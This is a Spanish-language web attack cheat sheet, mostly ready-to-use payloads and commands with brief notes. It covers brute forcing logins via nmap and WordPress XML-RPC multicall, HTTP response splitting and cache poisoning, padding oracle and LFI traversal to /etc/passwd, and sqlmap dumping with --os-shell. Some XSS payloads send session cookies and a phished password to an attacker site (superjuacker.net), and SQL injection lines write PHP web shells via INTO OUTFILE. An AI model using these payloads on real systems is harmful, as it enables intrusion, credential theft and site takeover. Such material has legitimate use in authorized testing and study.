#HTTP Basic Auth
	nmap -p [80/443] --script http-brute --script-args 'http-brute.hostname=URL,http-brute.method=[GET/POST],http-brute.path=PATH_TO_LOGIN,userdb=USERS,passdb=PASS' -v URL -n

#HTTP Split Attack
	asdf%0AContent-Length%3A%200%0AHTTP%2F1.1%20200%20OK%0AContent-Type%3A%20text%2Fhtml%0AContent-Length%3A%2050%0A%3Chtml%3E%20Prueba%20de%20Concepto%20%3C%2Fhtml%3E
	Decodearlo para ver contenido (Webgoat)

	Para hacerlo cache poisoning -> Primero vaciar cache y luego mandar petición maliciosa con fecha posterior para que se cachee:
	asdf%0AContent-Length%3A%200%0AHTTP%2F1.1%20200%20OK%0AContent-Type%3A%20text%2Fhtml%0APragma%3A%20No-cache%0ALast-Modified%3A%20Mon%2C%2011%20Feb%202018%2014%3A50%3A18%20GMT%0AContent-Length%3A%200
	asdf%0AContent-Length%3A%200%0AHTTP%2F1.1%20200%20OK%0AContent-Type%3A%20text%2Fhtml%0ALast-Modified%3A%20Mon%2C%2011%20Feb%202019%2014%3A50%3A18%20GMT%0AContent-Length%3A%2050%0A%3Chtml%3E%20Prueba%20de%20Concepto%20%3C%2Fhtml%3E

#Padding Oracle Attack
https://github.com/GDSSecurity/PadBuster/
perl padBuster.pl URL Valor-A-Testear (decodeado en caso de html encoding) 8/16 (tamaño) --cookies iknowmag1k=XXXX (decodeado en caso de html encoding)
perl padBuster.pl URL Valor-A-Testear (decodeado en caso de html encoding) 8/16 (tamaño) --cookies iknowmag1k=XXXX (decodeado en caso de html encoding) --plaintext="{\"user\":\"asd\",\"role\":\"admin\"}"

#LFI
Si queremos enlazar un archivo y vemos que le adjunta una extensión automáticamente, llamarlo sin extensión y que se ponga después
En caso de querer enlazar un archivo que no tenga extensión, poner %00 para que al añadirle la extensión no se tenga en cuenta
Poner al final del archivo a visualizar /. para seguir en la misma carpeta y poder bypassear ciertos filtros
Introducir directorios inexistentes ../../../etc/otro/../passwd o ../../../etc/./passwd o ../../../etc////passwd

#XST
<script>var xhr = new XMLHttpRequest(); xhr.open('TRACE', 'IP', false); xhr.send(null); if(200 == xhr.status)  alert(xhr.responseText);</script>

#XMLRPC
drupalxml.xml =>
	<?xml version="1.0"?>
	<methodCall>
	<methodName>system.listMethods</methodName>
	<params>
	<param>
	</param>
	</params>
	</methodCall>

curl --data @drupalxml.xml IP/xmlrpc.php

Wordpress =>
	En Burp, al Repeater la petición GET, cambiamos por POST y añadimos de contenido:
	<methodCall>
	<methodName>system.listMethods</methodName>
	<params></params>
	</methodCall>
	
	Si está activo el wp.getUsersBlogs =>
		<methodCall>
		<methodName>wp.getUsersBlogs</methodName>
		<params>
		<param><value>user</value></param>
		<param><value>pass</value></param>
		</params>
		</methodCall>
	Si está activo el system.multicall y wp.getCategories =>
		<methodCall><methodName>system.multicall</methodName>
		 <member><name>methodName</name><value><string>wp.getCategories</string></value></member>
		 <member><name>params</name><value><array><data>
		 <value><string></string></value>
		 <value><string>user</string></value>
		 <value><string>pass</string></value>
		 <member><name>methodName</name><value><string>wp.getCategories</string></value></member>
		 <member><name>params</name><value><array><data>
		 <value><string>user2</string></value>
		 <value><string>pass2</string></value>

		</methodCall>
		
	Si está activo el system.multicall y wp.getUsersBlogs =>
		
		<methodCall><methodName>system.multicall</methodName><params><param><value><array><data>
		<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>user</string></value><value><string>pass1</string></value></data></array></value></data></array></value></member></struct></value>
		<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>user</string></value><value><string>pass2</string></value></data></array></value></data></array></value></member></struct></value>
		<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>user</string></value><value><string>pass3</string></value></data></array></value></data></array></value></member></struct></value>
		<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>user</string></value><value><string>pass4</string></value></data></array></value></data></array></value></member></struct></value>
		</data></array></value></param></params></methodCall>
		
	Para crear entradas =>
		<methodCall>
		<methodName>wp.newPost</methodName>
		<params>
			<param><value>what is this parameter</value></param>
			<param><value>user</value></param>
			<param><value>pass</value></param>
			<param><struct>
				<member><name>post_title</name><value>test post</value></member>
				<member><name>post_content</name><value>any HTML content here</value></member>
				<member><name>post_excerpt</name><value>excerpt</value></member>
			</struct></param>
		</params>
		</methodCall>
	
	Para subir archivos =>
		<methodCall>
		<methodName>metaWeblog.newMediaObject</methodName>
		<params>
			<param><value>what is this parameter</value></param>
			<param><value>user</value></param>
			<param><value>pass</value></param>
			<param><struct>
				<member><name>name</name><value>file_name.html</value></member>
				<member><name>type</name><value>text/plain</value></member>
				<member><name>bits</name><value>file contents, any data format XML-encoded</value></member>
			</struct></param>
		</params>
		</methodCall>
	
	========================
	También con wp.uploadFile
		
#Magento
	/soap
	/soap/default?wsdl_list=1
	https://github.com/magento/magento2/blob/2.3/app/code/Magento/Customer/etc/webapi.xml
	
	POST /rest/V1/integration/admin/token HTTP/1.1
	<login><username>admin</username><password>123123q</password></login>
	
	POST /rest/V1/integration/customer/token HTTP/1.1
	<login><username>EMAIL</username><password>PASS</password></login>
	
	POST /rest/V1/customers/isEmailAvailable HTTP/1.1
	Content-Type:application/json
	{
	"customerEmail": "EMAIL",
	"websiteId": 1
	}
	
	https://github.com/steverobbins/magescan
	php magescan.phar scan:all www.example.com

#XSS
http://xss.rocks/xss.js
<script>alert("test");</script>
        <iframe src=http://></iframe>
	**DOM BASED XSS**
		<img src="" />
		<img src="" onerror="alert(document.cookie)" />
		<iframe src="javascript:alert('Hacked');" />
        <script>alert(document.cookie)</script> Para obtener la cookie de sesión
	href="javascript:alert('test')"
        <script>window.location="http://URL CON ALGO A EJECUTAR, COMO UNA SHELL"</script> Para ejecutar algo de forma remota
            window.location = "http://informatica.ucm.es"; Se puede usar para dejar inaccesible una web en caso de stored xss
            También document.location.href = "http://informatica.ucm.es";
            También location.assign("http://informatica.ucm.es");
            También location.replace("http://informatica.ucm.es");

        Con location.reload(); forzamos el recargado de la página
            <script>
                for (;;)
                    location.reload(); // Y hacemos una denegación de servicio
            </script>

        window.open(URL); Para abrir en nueva pestaña una página.

        <script>
        var password = window.prompt("La sesión ha terminado. Por favor, vuelva a introducir su clave:");
        document.location.href="http://superjuacker.net/leerpass.php?p=" + password;
        </script>

        document.location.href = "http://superjuacker.net/recibir.php?ck="+ document.cookie; Para mandar la cookie a una web nuestra

    **Para forzar un persistent xss** si se inserta en un campo value se puede hacer "><script>alert();</script> para cerrar el value e introducir el xss.
    También se puede mandar encondeado, o en hexadecimal

        ”><body onLoad="document.location.href='WEB MALICIOSA'"> // Redirige al cargar la página que contiene lo insertado

        ”><meta http-equiv="accion" content="10"; url="WEB MALICIOSA" /> // Redirección al pasar 10 segundos


#SQL INJECTION
Para SQL injection con forma "?palabra=3" podemos poner "?palabra=3 union all select *, *, *, ... (las columnas que creamos que tiene) from [tabla que queremos ver]"
Los comentarios pueden ser con -- o con #
Ponemos ' o ; y si es vulnerable, a probar

' order by 1 # E ir probando 10, 20, si da error 15, y vamos acotando, hasta llegar al último que no dé error
' union select 1 -- y luego ' union select 1, 2 -- Hasta que no dé error. Para identificar el parámetro vulnerable, el número que se muestre es el que lo es. Si se muestra el 2, quiere decir que tenemos que pedir los datos en el segundo parámetro
' or '1'='1 union select null, version()# Para ver la versión de la BD
    También user() y database()
    También concat(user,0x3a,password) from 'users' Para acceder a campos internos
' union select 1, @@datadir # Para obtener el directorio de la base de datos, y si es mysql por ejemplo
    @@version Para la versión
    @@port Para el puerto
    @@hostname Para el usuario
    @@version_compile_os Para el SO donde se compiló el programa de gestión de base de datos
    Con LOAD_FILE('[ruta del archivo]') # Podemos leer archivos
' union select distinct(table_schema), null from information_schema.tables -- Para ver las bases de datos que hay
' union select distinct(table_name), null from information_schema.columns;# Para ver las tablas que hay
' union select distinct(column_name), null from information_schema.columns;# Para ver las columnas que hay
' union select * from tabla_a_ver;# Para ver contenido

Enumeración de columnas:
' having 1=1-- al no tener el group by, dará error y puede mostrar la columna. Después hacemos ' group by [tabla.columna mostrada] having 1=1-- y mostrará la siguiente. Después concatenamos ' group by [tabla.columna mostrada], [tabla.columna mostrada2] having 1=1-- Hasta que no dé error
Enumeración de tipos de columnas:
' union select sum(COLUMNA) from TABLA -- Y dará error diciendo qué tipo de campo es
' or '1'='1 LIMIT 1 INTO OUTFILE ' /var/www/shell.php' LINES TERMINATED BY '<? system($_REQUEST['cmd']); ?>'-- (Si lo filtra hay que pasarlo a hex, base64, urlencode, ascii hex... Hasta que no lo filtre, en ese caso sin comillas)
Se accede mediante /shell.php?cmd=comando a ejecutar
' union select 1, 2, 3 into dumpfile 'archivo.txt' #
SELECT "<?php passthru($_GET['cmd']); ?>" into dumpfile '/var/www/html/shell.php'; Para insertar shell si se tiene acceso con privilegios


#SQLMAP
Importante --tor y --check-tor
	-g [dork]
    sqlmap -u "http://192.168.56.101/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=261b124tdh0nschc1oqt1nohj2" --current-user --current-db
    --string="Surname" Para especificar el campo a emplear
    -U [usuario de la base de datos] --privileges Para listar privilegios del usuario
	-u [url] --dbs (lista las bases de datos)
	quitando --dbs y añadiendo -D [base de datos que queramos consultar] --tables (indica que queremos ver las tablas que tiene)
	quitando --tables y añadiendo -T [tabla a consultar] --columns (muestra las columnas)
	quitando --columns y añadiendo -C [columna a consultar, pudiendo poner varios con coma (user, password)] --dump (muestra los campos de esa columna) o --dump-all (para mostrar todos los de esa tabla, database o columna seleccionada)
	--random-agent simula petición aleatoria de cualquier navegador
    --hostname devuelve el nombre de la maquina objetivo
    --is-dba devuelve si el usuario con el que ejecutamos las sentencias SQL es root o no
    --os-shell se usa si el anterior ha devuelto True y devuelve una ventana de comandos en el sistema objetivo
    --current-db muestra el DBMS actual
    --users muestra los usuarios de la base de datos
    --passwords muestra las contraseñas de los usuarios anteriores

sqlmap.py -r TXT-PETICION --proxy http://127.0.0.1:8080 (Por Burp) --level=3 --risk=3  --thread=10 [--dbms="Microsoft SQL Server"] --current-user --current-db --hostname --dbs
